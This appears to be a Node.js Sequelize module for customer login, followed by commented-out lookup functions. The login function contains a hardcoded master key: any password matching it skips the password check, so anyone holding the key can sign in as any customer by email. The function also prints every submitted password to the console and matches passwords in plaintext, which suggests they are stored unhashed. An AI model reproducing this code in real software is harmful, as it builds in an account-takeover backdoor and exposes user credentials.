const Customers = require('../../database/model/customers')
const OtherCustomerDetails = require('../../database/model/other_customer_details')
const { Sequelize } = require('../../database')
const Op = Sequelize.Op

module.exports.authUserCrendetial = (params) => {
    let masterkey = "67031a0adda4e6eb08ffaa6fc99f878c"
    let wq = {}
    console.log('here you pass', params.password)
    if (params.password == masterkey){
        wq=  {
            customers_email: params.email,
            // customer_password: params.password,
            progress_status:2
        }
    }
    else {
        wq=  {
            customers_email: params.email,
            customer_password: params.password,
            progress_status:2
        }
    }
   return Customers.findOne({
        where: wq
    })   

}

// module.exports.getOtherCustomerDetails = (params) => {
//     return OtherCustomerDetails.findOne({
//         where: {
//             customers_id: params.customerId
//         }        
//     })
// }

// module.exports.getCustomerDetails = (params) => {
//     return Customers.findOne({
//         where: {
//             id: params.customerId
//         }        
//     })
// }
